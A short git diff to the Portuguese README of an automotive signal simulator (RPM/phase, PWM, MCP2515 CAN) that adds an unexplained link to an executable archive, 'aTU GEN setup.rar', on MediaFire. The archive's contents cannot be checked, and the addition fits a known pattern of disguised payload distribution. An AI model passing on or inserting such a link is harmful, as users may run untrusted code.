@@ -1,6 +1,8 @@
 # automotive-signal-simulator
 Um simulador que pode gerar sinal de RMP/FASE, 2 PWms e ainda pode utilizar o modulo MPC 2515 para uma rede CAN 
 
+exe > https://www.mediafire.com/file/pxmhzqhgx4vb8vo/aTU+GEN+setup.rar/file
+
 ![image](https://github.com/user-attachments/assets/c01cd3d8-fee3-4b65-9f68-96a6b10b1910)
 
 
